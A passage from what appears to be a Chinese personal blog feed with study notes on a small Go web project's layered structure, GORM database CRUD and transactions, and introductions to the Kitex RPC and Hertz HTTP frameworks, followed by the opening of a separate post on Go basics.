<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> repository</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="string">&quot;test01/server/util&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Post <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id         <span class="type">int64</span>     <span class="string">`gorm:&quot;column:id&quot;`</span></span><br><span class="line">	ParentId   <span class="type">int64</span>     <span class="string">`gorm:&quot;column:parent_id&quot;`</span></span><br><span class="line">	UserId     <span class="type">int64</span>     <span class="string">`gorm:&quot;column:user_id&quot;`</span></span><br><span class="line">	Content    <span class="type">string</span>    <span class="string">`gorm:&quot;column:content&quot;`</span></span><br><span class="line">	DiggCount  <span class="type">int64</span>     <span class="string">`gorm:&quot;column:digg_count&quot;`</span></span><br><span class="line">	CreateTime time.Time <span class="string">`gorm:&quot;column:create_time&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Post)</span></span> TableName() <span class="type">string</span> &#123; <span class="keyword">return</span> <span class="string">&quot;post&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PostDao <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> postDao *PostDao</span><br><span class="line"><span class="keyword">var</span> postOnce sync.Once</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewPostDaoInstance</span><span class="params">()</span></span> *PostDao &#123;</span><br><span class="line">	postOnce.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		postDao = &amp;PostDao&#123;&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">return</span> postDao</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*PostDao)</span></span> QueryPostById(id <span class="type">int64</span>) (*Post, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> post Post</span><br><span class="line">	err := db.Where(<span class="string">&quot;id=?&quot;</span>, id).Find(&amp;post).Error</span><br><span class="line">	<span class="keyword">if</span> err == gorm.ErrRecordNotFound &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Error(<span class="string">&quot;find post by id err:&quot;</span> + err.Error())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;post, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*PostDao)</span></span> QueryPostByParentId(parentId <span class="type">int64</span>) ([]*Post, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> posts []*Post</span><br><span class="line">	err := db.Where(<span class="string">&quot;parent_id = ?&quot;</span>, parentId).Find(&amp;posts).Error</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Error(<span class="string">&quot;find posts by parent_id err:&quot;</span> + err.Error())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> posts, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*PostDao)</span></span> CreatePost(post *Post) <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := db.Create(post).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Error(<span class="string">&quot;create post err:&quot;</span> + err.Error())</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先就是创建了一个Post结构体去对应着表中的列，这样也就可以更好的去操作数据库</p>
<p>然后就是通过单例模式创建对应的数据库操作实例，从而避免了资源的浪费。</p>
<p>然后就是接下来的三个方法，就是QueryPostById通过id查询Post记录</p>
<p>QueryPostByParentId通过parentId查询多条post记录</p>
<p>CreatePost就是创建一条新的post</p>
<p>自此，我们就大概了解了如何通过go框架去操作数据库了</p>
<p>这时候也就剩下了最后一个文件夹，handler</p>
<p>这也就是处理程序的文件夹，用于处理对路由访问的并且返回对应所需结果的</p>
<p>我们可以看到有两个文件，启动publish_post就是将请求的队友结果返回</p>
<p>而query_page_info则是将对应的发布文章的请求进行处理并返回对应结果。</p>
<p>这里我们能够发现handler中的代码是调用了service层的方法的，这里我们也就可以剖析整个程序的流程了</p>
<p>server.go中的路由—–&gt; handler——&gt;service—–&gt;repository</p>
<p>这也就是整个该项目的流程了</p>
<p>也就和java很像感觉。</p>
<p>最后就是对于service层的讲解</p>
<p>这里也就还是两个文件，对应handler中的两个操作</p>
<p>由service层调用数据库操作，从而获取到对应的数据，从而将其能够将数据返回。</p>
<p>自此，这个小项目的结构也就明了了，这也能够更加方便我们之后自己去开发项目，也要有着对应的结构，这样才能更好的去快速编写对应的功能。</p>
<h2 id="3、项目总结"><a href="#3、项目总结" class="headerlink" title="3、项目总结"></a>3、项目总结</h2><p>最后就是对整个项目的总结，这里我们了解了gin框架，并且完成了第一个go语言项目的编写，我们需要详细明白对应的项目结构，有着清晰的项目结构，才能更好的保障我们代码的可读性，还是gin框架，我感觉还是算是比较简单的，但是对于其操作数据库来说，我感觉稍微有点麻烦，毕竟对于每一个表都需要一个go文件与其对应才能使用，这样感觉有点啰嗦了。当然也不是说不好，只是个人这么感觉而已。<br>最后就是类比go语言和java，我感觉go语言中特别多的就是对于错误的处理，经常需要使用err去接受错误，并且去判断错误，以及打印，这点稍微有点麻烦，不过也有好处，就是能够快捷的指导自己代码哪里有错误什么的，方便去进行修改。</p>
<h1 id="二、Gorm-Kitex-Hertz讲解"><a href="#二、Gorm-Kitex-Hertz讲解" class="headerlink" title="二、Gorm&#x2F;Kitex&#x2F;Hertz讲解"></a>二、Gorm&#x2F;Kitex&#x2F;Hertz讲解</h1><h2 id="1、Gorm框架"><a href="#1、Gorm框架" class="headerlink" title="1、Gorm框架"></a>1、Gorm框架</h2><p>这也是我们上面的小项目中所涉及使用到的框架，是用于操作数据库的一个框架。</p>
<p>这里附上一个GORM框架的中文文档<a href="https://gorm.io/zh_CN/docs/index.html">https://gorm.io/zh_CN/docs/index.html</a></p>
<p>安装的话就不过多讲了，自己看文档都是有的</p>
<h2 id="2、链接初始化"><a href="#2、链接初始化" class="headerlink" title="2、链接初始化"></a>2、链接初始化</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参考 https://github.com/go-sql-driver/mysql#dsn-data-source-name 获取详情</span></span><br><span class="line">dsn := <span class="string">&quot;user:pass@tcp(127.0.0.1:3306)/dbname?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br></pre></td></tr></table></figure>

<p>通过设置dsn，去打开数据库，而且也能够在后边对Config进行相应的数据库连接设置。(包括一些基本设置，以及可以自定义对应的数据库驱动等等)</p>
<h2 id="3、CRUD接口"><a href="#3、CRUD接口" class="headerlink" title="3、CRUD接口"></a>3、CRUD接口</h2><p>完成了简单的数据库的初始化之后，我们就可以对数据库进行对应的一系列的操作了，Gorm支持所有对数据库的操作，这里我们也就一一简单介绍一下。</p>
<h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>这里要注意的是，使用Gorm对于数据库的操作，针对每个表，我们都需要有个对应的模型结构体去对应数据库的表以及其中的字段。</p>
<p>通俗来说，就是对于数据库操作中，我们习惯性创建一个repository文件夹，启动放置对应数据库有多少表就有多少个文件，一一对应着操作每个表。</p>
<p>并且每个文件中都要定义对应的结构体，也就是如下图所示</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gorm.Model 的定义</span></span><br><span class="line"><span class="keyword">type</span> Model <span class="keyword">struct</span> &#123;</span><br><span class="line">  ID        <span class="type">uint</span>           <span class="string">`gorm:&quot;primaryKey&quot;`</span></span><br><span class="line">  CreatedAt time.Time</span><br><span class="line">  UpdatedAt time.Time</span><br><span class="line">  DeletedAt gorm.DeletedAt <span class="string">`gorm:&quot;index&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里注意，如果不使用<code>gorm:&quot;xxxx&quot;</code>去对字段进行申明，结构体字段名称转换为 <code>snake_case</code> 作为数据库中的列名</p>
<p>以及对应表名，我们可以使用Tablename方法去设置func (Post) TableName() string { return “post” }，也可以使用默认的所对应命名，也就是将结构体名称转换为 <code>snake_case</code> 并为表名加上复数形式。 例如，一个 <code>User</code> 结构体在数据库中的表名变为 <code>users</code></p>
</blockquote>
<p>并且使用Gorm框架的情况下，我们还能去包含一些特定的字段，实现更好的功能</p>
<ul>
<li><code>ID</code> ：每个记录的唯一标识符（主键）。</li>
<li><code>CreatedAt</code> ：在创建记录时自动设置为当前时间。</li>
<li><code>UpdatedAt</code>：每当记录更新时，自动更新为当前时间。</li>
<li><code>DeletedAt</code>：用于软删除（将记录标记为已删除，而实际上并未从数据库中删除）。</li>
</ul>
<p>基础使用的话这些已经足够了，至于更加高级的，就可以去自己查看官方文档即可。</p>
<h3 id="1、创建"><a href="#1、创建" class="headerlink" title="1、创建"></a>1、创建</h3><p>直接使用上面返回的数据库，使用结构体的指针方式去创建对应的数据 </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">user := User&#123;Name: <span class="string">&quot;Jinzhu&quot;</span>, Age: <span class="number">18</span>, Birthday: time.Now()&#125;</span><br><span class="line">result := db.Create(&amp;user) <span class="comment">// 通过数据的指针来创建</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里一定要注意，传入的是结构体的指针，而不是单纯的结构体</p>
</blockquote>
<p>用着指定的字段创建记录</p>
<blockquote>
<p>创建记录并为指定字段赋值。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Select(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;Age&quot;</span>, <span class="string">&quot;CreatedAt&quot;</span>).Create(&amp;user)</span><br></pre></td></tr></table></figure>

<p>创建记录并忽略传递给 ‘Omit’ 的字段值</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Omit(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;Age&quot;</span>, <span class="string">&quot;CreatedAt&quot;</span>).Create(&amp;user)</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="批量插入"><a href="#批量插入" class="headerlink" title="批量插入"></a>批量插入</h4><p>这里批量插入我们使用传入一个切片去完成，或者也可以使用map去创建也是可以的</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> users = []User&#123;&#123;Name: <span class="string">&quot;jinzhu1&quot;</span>&#125;, &#123;Name: <span class="string">&quot;jinzhu2&quot;</span>&#125;, &#123;Name: <span class="string">&quot;jinzhu3&quot;</span>&#125;&#125;</span><br><span class="line">db.Create(&amp;users)</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Model(&amp;User&#123;&#125;).Create(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">  <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;jinzhu&quot;</span>, <span class="string">&quot;Age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="2、查询"><a href="#2、查询" class="headerlink" title="2、查询"></a>2、查询</h3><p>GORM 提供了 <code>First</code>、<code>Take</code>、<code>Last</code> 方法，以便从数据库中检索单个对象。当查询数据库时它添加了 <code>LIMIT 1</code> 条件，且没有找到记录时，它会返回 <code>ErrRecordNotFound</code> 错误</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241112174939548.png" alt="image-20241112174939548"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">如果你想避免ErrRecordNotFound错误，你可以使用Find，比如db.Limit(<span class="number">1</span>).Find(&amp;user)，Find方法可以接受<span class="keyword">struct</span>和slice的数据。</span><br><span class="line">建议就是尽量使用find而不是first以避免出现一些错误。</span><br></pre></td></tr></table></figure>

<h4 id="根据主键检索"><a href="#根据主键检索" class="headerlink" title="根据主键检索"></a>根据主键检索</h4><p>如果主键是数字类型，您可以使用 <a href="https://gorm.io/zh_CN/docs/query.html#inline_conditions">内联条件</a> 来检索对象。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.First(&amp;user, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 10;</span></span><br><span class="line">db.First(&amp;user, <span class="string">&quot;10&quot;</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 10;</span></span><br><span class="line">db.Find(&amp;users, []<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id IN (1,2,3);</span></span><br></pre></td></tr></table></figure>

<p>如果主键是字符串(例如像uuid这种)，查询将会被写成如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.First(&amp;user, <span class="string">&quot;id = ?&quot;</span>, <span class="string">&quot;1b74413f-f3b8-409f-ac47-e8c062e3472a&quot;</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = &quot;1b74413f-f3b8-409f-ac47-e8c062e3472a&quot;;</span></span><br></pre></td></tr></table></figure>

<h4 id="检索全部对象"><a href="#检索全部对象" class="headerlink" title="检索全部对象"></a>检索全部对象</h4><p>直接通过find去查找即可，这里要注意的是一下的部分</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">result.RowsAffected <span class="comment">// returns found records count, equals `len(users)`</span></span><br><span class="line">result.Error        <span class="comment">// returns error</span></span><br></pre></td></tr></table></figure>

<h4 id="通过条件检索"><a href="#通过条件检索" class="headerlink" title="通过条件检索"></a>通过条件检索</h4><h5 id="String条件"><a href="#String条件" class="headerlink" title="String条件"></a>String条件</h5><p>使用Where方法即可</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241112180255808.png" alt="image-20241112180255808"></p>
<h5 id="通过Struct-Map检索"><a href="#通过Struct-Map检索" class="headerlink" title="通过Struct&amp;Map检索"></a>通过Struct&amp;Map检索</h5><p>可以通过结构体和Map去达到匹配多项的条件查询的目的</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241112180751008.png" alt="image-20241112180751008"></p>
<p>但这里有一点要注意的就是，使用结构体查询是不会匹配空字符串或者0的，会进行忽略，只有使用map的话才能完成对应的匹配</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Where(&amp;User&#123;Name: <span class="string">&quot;jinzhu&quot;</span>, Age: <span class="number">0</span>&#125;).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = &quot;jinzhu&quot;;</span></span><br><span class="line"></span><br><span class="line">db.Where(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;<span class="string">&quot;Name&quot;</span>: <span class="string">&quot;jinzhu&quot;</span>, <span class="string">&quot;Age&quot;</span>: <span class="number">0</span>&#125;).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = &quot;jinzhu&quot; AND age = 0;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、更新"><a href="#3、更新" class="headerlink" title="3、更新"></a>3、更新</h3><h4 id="保存所有字段"><a href="#保存所有字段" class="headerlink" title="保存所有字段"></a>保存所有字段</h4><p><code>Save</code>是也贵组合函数。如果保存值不包含主键，它将执行 <code>Create</code>，否则它将执行 <code>Update</code> (包含所有字段)。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Save(&amp;User&#123;Name: <span class="string">&quot;jinzhu&quot;</span>, Age: <span class="number">100</span>&#125;)</span><br><span class="line"><span class="comment">// INSERT INTO `users` (`name`,`age`,`birthday`,`update_at`) VALUES (&quot;jinzhu&quot;,100,&quot;0000-00-00 00:00:00&quot;,&quot;0000-00-00 00:00:00&quot;)</span></span><br><span class="line"></span><br><span class="line">db.Save(&amp;User&#123;ID: <span class="number">1</span>, Name: <span class="string">&quot;jinzhu&quot;</span>, Age: <span class="number">100</span>&#125;)</span><br><span class="line"><span class="comment">// UPDATE `users` SET `name`=&quot;jinzhu&quot;,`age`=100,`birthday`=&quot;0000-00-00 00:00:00&quot;,`update_at`=&quot;0000-00-00 00:00:00&quot; WHERE `id` = 1</span></span><br></pre></td></tr></table></figure>

<h4 id="更新单个列"><a href="#更新单个列" class="headerlink" title="更新单个列"></a>更新单个列</h4><p>这就很简单了，直接使用update即可。</p>
<h4 id="更新多个列"><a href="#更新多个列" class="headerlink" title="更新多个列"></a>更新多个列</h4><p>也是类似，使用结构体和map就行，能够进行多列的更新。</p>
<h4 id="更新所选定的字段"><a href="#更新所选定的字段" class="headerlink" title="更新所选定的字段"></a>更新所选定的字段</h4><p>这里可以通过加一些选择进行对应选定字段的更新。</p>
<h3 id="4、删除"><a href="#4、删除" class="headerlink" title="4、删除"></a>4、删除</h3><p>最后就是删除了，删除应该算是最简单的了</p>
<p>直接就是可以通过Delete去对某列进行删除。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 带额外条件的删除</span></span><br><span class="line">db.Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;jinzhu&quot;</span>).Delete(&amp;email)</span><br><span class="line"><span class="comment">// DELETE from emails where id = 10 AND name = &quot;jinzhu&quot;;</span></span><br></pre></td></tr></table></figure>

<h3 id="5、原生SLQ的使用"><a href="#5、原生SLQ的使用" class="headerlink" title="5、原生SLQ的使用"></a>5、原生SLQ的使用</h3><p>使用Raw和Scan去指定SQL语句</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result Result</span><br><span class="line">db.Raw(<span class="string">&quot;SELECT id, name, age FROM users WHERE id = ?&quot;</span>, <span class="number">3</span>).Scan(&amp;result)</span><br></pre></td></tr></table></figure>

<p>Exec原生SQL</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exec with SQL Expression</span></span><br><span class="line">db.Exec(<span class="string">&quot;UPDATE users SET money = ? WHERE name = ?&quot;</span>, gorm.Expr(<span class="string">&quot;money * ? + ?&quot;</span>, <span class="number">10000</span>, <span class="number">1</span>), <span class="string">&quot;jinzhu&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4、事务"><a href="#4、事务" class="headerlink" title="4、事务"></a>4、事务</h2><h3 id="禁用默认事务"><a href="#禁用默认事务" class="headerlink" title="禁用默认事务"></a>禁用默认事务</h3><p>为了确保数据一致性，GORM 会在事务里执行写入操作（创建、更新、删除）。如果没有这方面的要求，您可以在初始化时禁用它，这将获得大约 30%+ 性能提升。</p>
<p>可以通过SkipDefaultTransaction对应配置去关闭</p>
<h3 id="手动事务"><a href="#手动事务" class="headerlink" title="手动事务"></a>手动事务</h3><p>Gorm 支持直接调用事务控制方法（commit、rollback），例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开始事务</span></span><br><span class="line">tx := db.Begin()</span><br><span class="line"><span class="comment">// 在事务中执行一些 db 操作（从这里开始，您应该使用 &#x27;tx&#x27; 而不是 &#x27;db&#x27;）</span></span><br><span class="line">tx.Create(...)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 遇到错误时回滚事务</span></span><br><span class="line">tx.Rollback()</span><br><span class="line"><span class="comment">// 否则，提交事务</span></span><br><span class="line">tx.Commit()</span><br></pre></td></tr></table></figure>

<p>这样差不多，Gorm的使用我们大致也就了解了，接下来就是让我们进入Kitex的学习!</p>
<h3 id="自动提交事务"><a href="#自动提交事务" class="headerlink" title="自动提交事务"></a>自动提交事务</h3><p>Gorm提供了Tansaction方法用于自动提交事务，避免用户漏写Commit、Rollback</p>
<h2 id="5、Gorm生态"><a href="#5、Gorm生态" class="headerlink" title="5、Gorm生态"></a>5、Gorm生态</h2><table>
<thead>
<tr>
<th>GORM 代码生成工具</th>
<th><a href="https://github.com/go-gorm/gen">https://github.com/go-gorm/gen</a></th>
</tr>
</thead>
<tbody><tr>
<td>GORM 分片库方案</td>
<td><a href="https://github.com/go-gorm/sharding">https://github.com/go-gorm/sharding</a></td>
</tr>
<tr>
<td>GORM 手动索引</td>
<td><a href="https://github.com/go-gorm/hints">https://github.com/go-gorm/hints</a></td>
</tr>
<tr>
<td>GORM 乐观锁</td>
<td><a href="https://github.com/go-gorm/optimisticlock">https://github.com/go-gorm/optimisticlock</a></td>
</tr>
<tr>
<td>GORM 读写分离</td>
<td><a href="https://github.com/go-gorm/dbresolver">https://github.com/go-gorm/dbresolver</a></td>
</tr>
<tr>
<td>GORM OpenTelemetry扩展</td>
<td><a href="https://github.com/go-gorm/opentelemetry">https://github.com/go-gorm/opentelemetry</a></td>
</tr>
</tbody></table>
<p>关于更多的GORM用法可以查看Gorm的文档（<a href="https://gorm.cn/">https://gorm.cn</a>)</p>
<h2 id="6、Kitex"><a href="#6、Kitex" class="headerlink" title="6、Kitex"></a>6、Kitex</h2><p>这里先给上一个学习链接，本次总结也是主要针对链接内容进行的<a href="https://www.cloudwego.io/zh/docs/kitex/getting-started/">https://www.cloudwego.io/zh/docs/kitex/getting-started/</a></p>
<p>首先这边就是要先从RPC开始。</p>
<h3 id="RPC是什么？"><a href="#RPC是什么？" class="headerlink" title="RPC是什么？"></a>RPC是什么？</h3><p><strong>RPC</strong> (Remote Procedure Call) ，即远程过程调用。通俗来讲，就是调用远端服务的某个方法，并获取到对应的响应。RPC 本质上定义了一种通信的流程，而具体的实现技术没有约束，核心需要解决的问题为<strong>序列化</strong>与<strong>网络通信</strong>。如可以通过 <code>gob/json/pb/thrift</code> 来序列化和反序列化消息内容，通过 <code>socket/http</code> 来进行网络通信。只要客户端与服务端在这两方面达成共识，能够做到消息正确的解析接口即可。</p>
<blockquote>
<p>个人理解就是和HTTP挺类似的作用，使用RPC去能够实现类似HTTP远程访问的效果</p>
</blockquote>
<p>这里就还要讲到一个东西，也就是IDL，这个在RPC中十分的重要</p>
<h3 id="IDC又是什么？"><a href="#IDC又是什么？" class="headerlink" title="IDC又是什么？"></a>IDC又是什么？</h3><p><strong>IDL</strong> 全称是 Interface Definition Language，接口定义语言。</p>
<p>如果我们要使用 RPC 进行调用，就需要知道对方的接口是什么，需要传什么参数，同时也需要知道返回值是什么样的，就好比两个人之间交流，需要保证在说的是同一个语言、同一件事。IDL 就是为了解决这样的问题，通过 IDL 来约定双方的协议，就像在写代码的时候需要调用某个函数，我们需要知道 <code>签名</code>一样。</p>
<p>对于 RPC 框架，IDL 不仅作为接口描述语言，还会根据 IDL 文件生成指定语言的接口定义模块，这样极大简化了开发工作。服务提供方（服务端）需要做的变为 编写 IDL -&gt; 使用代码生成工具生成代码 -&gt; 实现接口；服务调用方（客户端）只需根据服务提供方（服务端）提供的 IDL 生成代码后进行调用。这当中还有服务发现、负载均衡等问题，但不属于 IDL 范畴，故不展开介绍。</p>
<p>Kitex 默认支持 <code>thrift</code> 和 <code>proto3</code> 两种 IDL。</p>
<p>对应的语法参考链接：</p>
<p>Thrift IDL 语法可参考：<a href="http://thrift.apache.org/docs/idl">Thrift interface description language</a>。</p>
<p>proto3 语法可参考：<a href="https://developers.google.com/protocol-buffers/docs/proto3">Language Guide(proto3)</a>。</p>
<blockquote>
<p>对于Kitex框架的知识点，短时间内页无法讲解清楚，强雷建议就是去看看上面官网中的那个小案例，能够理解明白很多。</p>
</blockquote>
<h2 id="7、Kitex生态"><a href="#7、Kitex生态" class="headerlink" title="7、Kitex生态"></a>7、Kitex生态</h2><table>
<thead>
<tr>
<th>XDS 扩展</th>
<th><a href="https://github.com/kitex-contrib/xds">https://github.com/kitex-contrib/xds</a></th>
</tr>
</thead>
<tbody><tr>
<td>opentelemetry 扩展</td>
<td><a href="https://github.com/kitex-contrib/obs-opentelemetry">https://github.com/kitex-contrib/obs-opentelemetry</a></td>
</tr>
<tr>
<td>ETCD 服务注册与发现扩展</td>
<td><a href="https://github.com/kitex-contrib/registry-etcd">https://github.com/kitex-contrib/registry-etcd</a></td>
</tr>
<tr>
<td>Nacos 服务注册与发现扩展</td>
<td><a href="https://github.com/kitex-contrib/registry-nacos">https://github.com/kitex-contrib/registry-nacos</a></td>
</tr>
<tr>
<td>Zookeeper 服务注册与发现扩展</td>
<td><a href="https://github.com/kitex-contrib/registry-zookeeper">https://github.com/kitex-contrib/registry-zookeeper</a></td>
</tr>
<tr>
<td>polaris 扩展</td>
<td><a href="https://github.com/kitex-contrib/polaris">https://github.com/kitex-contrib/polaris</a></td>
</tr>
<tr>
<td>丰富的示例代码与业务Demo</td>
<td><a href="https://github.com/cloudwego/kitex-examples/">https://github.com/cloudwego/kitex-examples/</a></td>
</tr>
</tbody></table>
<h2 id="8、Hertz"><a href="#8、Hertz" class="headerlink" title="8、Hertz"></a>8、Hertz</h2><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>Hertz[həːts] 是一个 Golang 微服务 HTTP 框架，在设计之初参考了其他开源框架 <a href="https://github.com/valyala/fasthttp">fasthttp</a>、<a href="https://github.com/gin-gonic/gin">gin</a>、<a href="https://github.com/labstack/echo">echo</a> 的优势， 并结合字节跳动内部的需求，使其具有高易用性、高性能、高扩展性等特点，目前在字节跳动内部已广泛使用。 如今越来越多的微服务选择使用 Golang，如果对微服务性能有要求，又希望框架能够充分满足内部的可定制化需求，Hertz 会是一个不错的选择。</p>
<p>看看文档就很能明白其实和gin框架还是很相似的，但相比gin而言，Hertz有一个很好的点，就是有自动代码生成，也就是和上面的Kitex类似的IDL，使用IDL接口去自动生成对应代码，能够大大方便我们去编写对应的代码，十分的方便。</p>
<h2 id="9、Hertz生态"><a href="#9、Hertz生态" class="headerlink" title="9、Hertz生态"></a>9、Hertz生态</h2><table>
<thead>
<tr>
<th>HTTP2 扩展</th>
<th><a href="https://github.com/hertz-contrib/http2">https://github.com/hertz-contrib/http2</a></th>
</tr>
</thead>
<tbody><tr>
<td>opentelemetry 扩展</td>
<td><a href="https://github.com/hertz-contrib/obs-opentelemetry">https://github.com/hertz-contrib/obs-opentelemetry</a></td>
</tr>
<tr>
<td>国际化扩展</td>
<td><a href="https://github.com/hertz-contrib/i18n">https://github.com/hertz-contrib/i18n</a></td>
</tr>
<tr>
<td>反向代理扩展</td>
<td><a href="https://github.com/hertz-contrib/reverseproxy">https://github.com/hertz-contrib/reverseproxy</a></td>
</tr>
<tr>
<td>JWT 鉴权扩展</td>
<td><a href="https://github.com/hertz-contrib/jwt">https://github.com/hertz-contrib/jwt</a></td>
</tr>
<tr>
<td>Websocket 扩展</td>
<td><a href="https://github.com/hertz-contrib/websocket">https://github.com/hertz-contrib/websocket</a></td>
</tr>
<tr>
<td>丰富的示例代码与业 Demo</td>
<td><a href="https://github.com/cloudwego/hertz-examples/">https://github.com/cloudwego/hertz-examples/</a></td>
</tr>
</tbody></table>
<h2 id="10、最后的小总结"><a href="#10、最后的小总结" class="headerlink" title="10、最后的小总结"></a>10、最后的小总结</h2><p>个人感觉字节的这套框架很大程度的方便了程序员的代码编写，特别是加入了很多种类型的自动代码生成，避免了一些简单重复代码的多次编写，感觉这方面就非常好。而且通过这次的学习，我发现，学习还得是看官方文档，官方文档讲的很细很透彻，加上字节对于文档建设还是非常好的，视频的话更多的起到的是一个引导的作用，更多的还得是看自己的学习！</p>
]]></content>
  </entry>
  <entry>
    <title>go基础学习</title>
    <url>/2024/10/21/go%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>最近也是开始尝试去学习一些go语言相关的知识</p>
<p>基于狂神的go语言的相关课程！</p>
<span id="more"></span>

<h1 id="一、go语言的背景以及下载安装配置"><a href="#一、go语言的背景以及下载安装配置" class="headerlink" title="一、go语言的背景以及下载安装配置"></a>一、go语言的背景以及下载安装配置</h1><h2 id="go语言的创始"><a href="#go语言的创始" class="headerlink" title="go语言的创始"></a>go语言的创始</h2><blockquote>
<p>为什么需要go语言的</p>
</blockquote>
<p>C 系统效率  开发起来比较复杂 </p>
<p>Java 开发相对来说简单了 （面向对象—）更符合人的思维  很多大型企业在用  培训机构  ssm ssh  springboot   java 人才多  单价低</p>
<p>效率要高 + 开发简单 &#x3D;  兼顾  （创造一种新语言  Go）   12 年  移动端 智能手机   85   95   时代进步了，我们需要一些更高效的东西，而不是一些历史的东西</p>
<p>最近十年来，C&#x2F;C++在计算领域没有很好得到发展，并没有新的系统编程语言出现。对开发程度和系统效率在很多情况下不能兼得。要么执行效率高，但低效的开发和编译，如C++；要么执行低效，但拥有有效的编译，如.NET、Java；所以需要一种拥有较高效的执行速度、编译速度和开发速度的编程语言，Go就横空出世了。</p>
